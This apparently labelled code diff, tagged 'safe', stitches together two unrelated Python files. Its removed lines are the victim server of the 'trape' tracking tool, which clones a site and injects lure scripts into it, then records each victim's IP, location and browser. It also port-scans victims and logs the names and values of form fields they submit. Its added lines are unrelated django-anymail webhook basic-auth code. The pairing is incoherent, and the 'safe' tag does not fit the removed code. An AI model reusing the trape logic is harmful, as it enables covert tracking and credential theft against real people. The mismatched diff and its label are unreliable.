@@ -2,204 +2,298 @@
 # Safety: safe
 # Category: safe
 
-#!/usr/bin/env python
+import warnings
 
-# -*- coding: utf-8 -*-
 
-#**
 
-#
+import six
 
-#########
+from django.http import HttpResponse
 
-# trape #
+from django.utils.crypto import constant_time_compare
 
-#########
+from django.utils.decorators import method_decorator
 
-#
+from django.views.decorators.csrf import csrf_exempt
 
-# trape depends of this file
+from django.views.generic import View
 
-# For full copyright information this visit: https://github.com/boxug/trape
 
-#
 
-# Copyright 2017 by boxug / <hey@boxug.com>
+from ..exceptions import AnymailInsecureWebhookWarning, AnymailWebhookValidationFailure
 
-#**
+from ..utils import get_anymail_setting, collect_all_methods, get_request_basic_auth
 
-import time
 
-import urllib2
 
-from flask import Flask, render_template, session, request, json
 
-from core.victim_objects import *
 
-import core.stats
+class AnymailBasicAuthMixin(object):
 
-from core.utils import utils
+    """Implements webhook basic auth as mixin to AnymailBaseWebhookView."""
 
-from core.db import Database
 
 
+    # Whether to warn if basic auth is not configured.
 
+    # For most ESPs, basic auth is the only webhook security,
 
+    # so the default is True. Subclasses can set False if
 
-# Main parts, to generate relationships among others
+    # they enforce other security (like signed webhooks).
 
-trape = core.stats.trape
+    warn_if_no_basic_auth = True
 
-app = core.stats.app
 
 
+    # List of allowable HTTP basic-auth 'user:pass' strings.
 
-# call database
+    basic_auth = None  # (Declaring class attr allows override by kwargs in View.as_view.)
 
-db = Database()
 
 
+    def __init__(self, **kwargs):
 
-class victim_server(object):
+        self.basic_auth = get_anymail_setting('webhook_secret', default=[],
 
-    @app.route("/" + trape.victim_path)
+                                              kwargs=kwargs)  # no esp_name -- auth is shared between ESPs
 
-    def homeVictim():
+        if not self.basic_auth:
 
-        opener = urllib2.build_opener()
+            # Temporarily allow deprecated WEBHOOK_AUTHORIZATION setting
 
-        headers = victim_headers()
+            self.basic_auth = get_anymail_setting('webhook_authorization', default=[], kwargs=kwargs)
 
-        opener.addheaders = headers
 
-        html = victim_inject_code(opener.open(trape.url_to_clone).read(), 'lure')
 
-        return html
+        # Allow a single string:
 
+        if isinstance(self.basic_auth, six.string_types):
 
+            self.basic_auth = [self.basic_auth]
 
-    @app.route("/register", methods=["POST"])
+        if self.warn_if_no_basic_auth and len(self.basic_auth) < 1:
 
-    def register():
+            warnings.warn(
 
-        vId = request.form['vId']
+                "Your Anymail webhooks are insecure and open to anyone on the web. "
 
-        if vId == '':
+                "You should set WEBHOOK_SECRET in your ANYMAIL settings. "
 
-          vId = utils.generateToken(5)
+                "See 'Securing webhooks' in the Anymail docs.",
 
+                AnymailInsecureWebhookWarning)
 
+        # noinspection PyArgumentList
 
-        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], request.user_agent.platform, request.user_agent.browser, request.user_agent.version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime("%Y-%m-%d - %H:%M:%S"))
+        super(AnymailBasicAuthMixin, self).__init__(**kwargs)
 
-        victimGeo = victim_geo(vId, 'city', request.form['countryCode'], request.form['country'], request.form['query'], request.form['lat'], request.form['lon'], request.form['org'], request.form['region'], request.form['regionName'], request.form['timezone'], request.form['zip'], request.form['isp'], str(request.user_agent))
 
 
+    def validate_request(self, request):
 
-        utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " A victim has been connected from " + utils.Color['blue'] + victimGeo.ip + utils.Color['white'] + ' with the following identifier: ' + utils.Color['green'] + vId + utils.Color['white'])
+        """If configured for webhook basic auth, validate request has correct auth."""
 
-        cant = int(db.sentences_victim('count_times', vId, 3, 0))
+        if self.basic_auth:
 
+            request_auth = get_request_basic_auth(request)
 
+            # Use constant_time_compare to avoid timing attack on basic auth. (It's OK that any()
 
-        db.sentences_victim('insert_click', [vId, trape.url_to_clone, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
+            # can terminate early: we're not trying to protect how many auth strings are allowed,
 
-        db.sentences_victim('delete_networks', [vId], 2)
+            # just the contents of each individual auth string.)
 
+            auth_ok = any(constant_time_compare(request_auth, allowed_auth)
 
+                          for allowed_auth in self.basic_auth)
 
-        if cant > 0:
+            if not auth_ok:
 
-            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " " + "It\'s his " + str(cant + 1) + " time")
+                # noinspection PyUnresolvedReferences
 
-            db.sentences_victim('update_victim', [victimConnect, vId, time.time()], 2)
+                raise AnymailWebhookValidationFailure(
 
-            db.sentences_victim('update_victim_geo', [victimGeo, vId], 2)
+                    "Missing or invalid basic auth in Anymail %s webhook" % self.esp_name)
 
-        else:
 
-            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " " + "It\'s his first time")
 
-            db.sentences_victim('insert_victim', [victimConnect, vId, time.time()], 2)
 
-            db.sentences_victim('insert_victim_geo', [victimGeo, vId], 2)
 
-        return json.dumps({'status' : 'OK', 'vId' : vId});
+# Mixin note: Django's View.__init__ doesn't cooperate with chaining,
 
+# so all mixins that need __init__ must appear before View in MRO.
 
+class AnymailBaseWebhookView(AnymailBasicAuthMixin, View):
 
-    @app.route("/nr", methods=["POST"])
+    """Base view for processing ESP event webhooks
 
-    def networkRegister():
 
-        vId = request.form['vId']
 
-        vIp = request.form['ip']
+    ESP-specific implementations should subclass
 
-        vnetwork = request.form['red']
+    and implement parse_events. They may also
 
-        if vId == '':
+    want to implement validate_request
 
-          vId = utils.generateToken(5)
+    if additional security is available.
 
-        utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "+" + utils.Color['white'] + "]" + utils.Color['whiteBold'] + " " + vnetwork + utils.Color['white'] + " session detected from " + utils.Color['blue'] + vIp + utils.Color['white'] + ' ' + "with ID: " + utils.Color['green'] + vId + utils.Color['white'])
+    """
 
 
 
-        cant = int(db.sentences_victim('count_victim_network', [vId, vnetwork], 3, 0))
+    def __init__(self, **kwargs):
 
+        super(AnymailBaseWebhookView, self).__init__(**kwargs)
 
+        self.validators = collect_all_methods(self.__class__, 'validate_request')
 
-        if cant > 0:
 
-            db.sentences_victim('update_network', [vId, vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
 
-        else:
+    # Subclass implementation:
 
-            db.sentences_victim('insert_networks', [vId, vIp, request.environ['REMOTE_ADDR'], vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
 
-        return json.dumps({'status' : 'OK', 'vId' : vId});
 
+    # Where to send events: either ..signals.inbound or ..signals.tracking
 
+    signal = None
 
-    @app.route("/redv")
 
-    def redirectVictim():
 
-        url = request.args.get('url')
+    def validate_request(self, request):
 
-        opener = urllib2.build_opener()
+        """Check validity of webhook post, or raise AnymailWebhookValidationFailure.
 
-        headers = victim_headers()
 
-        opener.addheaders = headers
 
-        html = victim_inject_code(opener.open(url).read(), 'vscript')
+        AnymailBaseWebhookView includes basic auth validation.
 
-        return html
+        Subclasses can implement (or provide via mixins) if the ESP supports
 
+        additional validation (such as signature checking).
 
 
-    @app.route("/regv", methods=["POST"])
 
-    def registerRequest():
+        *All* definitions of this method in the class chain (including mixins)
 
-        vrequest = victim_request(request.form['vId'], request.form['site'], request.form['fid'], request.form['name'], request.form['value'], request.form['sId'])
+        will be called. There is no need to chain to the superclass.
 
-        db.sentences_victim('insert_requests', [vrequest, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
+        (See self.run_validators and collect_all_methods.)
 
-        utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "=" + utils.Color['white'] + "]" + " " + 'Receiving data from: ' + utils.Color['green'] + vrequest.id + utils.Color['white']  + ' ' + 'on' + ' ' + utils.Color['blue'] + vrequest.site + utils.Color['white'] + '\t\n' + vrequest.fid + '\t' + vrequest.name + ':\t' + vrequest.value)
 
-        return json.dumps({'status' : 'OK', 'vId' : vrequest.id});
 
+        Security note: use django.utils.crypto.constant_time_compare for string
 
+        comparisons, to avoid exposing your validation to a timing attack.
 
-    @app.route("/tping", methods=["POST"])
+        """
 
-    def receivePing():
+        # if not constant_time_compare(request.POST['signature'], expected_signature):
 
-        vrequest = request.form['id']
+        #     raise AnymailWebhookValidationFailure("...message...")
 
-        db.sentences_victim('report_online', [vrequest], 2)
+        # (else just do nothing)
 
-        return json.dumps({'status' : 'OK', 'vId' : vrequest});
+        pass
+
+
+
+    def parse_events(self, request):
+
+        """Return a list of normalized AnymailWebhookEvent extracted from ESP post data.
+
+
+
+        Subclasses must implement.
+
+        """
+
+        raise NotImplementedError()
+
+
+
+    # HTTP handlers (subclasses shouldn't need to override):
+
+
+
+    http_method_names = ["post", "head", "options"]
+
+
+
+    @method_decorator(csrf_exempt)
+
+    def dispatch(self, request, *args, **kwargs):
+
+        return super(AnymailBaseWebhookView, self).dispatch(request, *args, **kwargs)
+
+
+
+    def head(self, request, *args, **kwargs):
+
+        # Some ESPs verify the webhook with a HEAD request at configuration time
+
+        return HttpResponse()
+
+
+
+    def post(self, request, *args, **kwargs):
+
+        # Normal Django exception handling will do the right thing:
+
+        # - AnymailWebhookValidationFailure will turn into an HTTP 400 response
+
+        #   (via Django SuspiciousOperation handling)
+
+        # - Any other errors (e.g., in signal dispatch) will turn into HTTP 500
+
+        #   responses (via normal Django error handling). ESPs generally
+
+        #   treat that as "try again later".
+
+        self.run_validators(request)
+
+        events = self.parse_events(request)
+
+        esp_name = self.esp_name
+
+        for event in events:
+
+            self.signal.send(sender=self.__class__, event=event, esp_name=esp_name)
+
+        return HttpResponse()
+
+
+
+    # Request validation (subclasses shouldn't need to override):
+
+
+
+    def run_validators(self, request):
+
+        for validator in self.validators:
+
+            validator(self, request)
+
+
+
+    @property
+
+    def esp_name(self):
+
+        """
+
+        Read-only name of the ESP for this webhook view.
+
+
+
+        Subclasses must override with class attr. E.g.:
+
+            esp_name = "Postmark"
+
+            esp_name = "SendGrid"  # (use ESP's preferred capitalization)
+
+        """
+
+        raise NotImplementedError("%s.%s must declare esp_name class attr" %
+
+                                  (self.__class__.__module__, self.__class__.__name__))
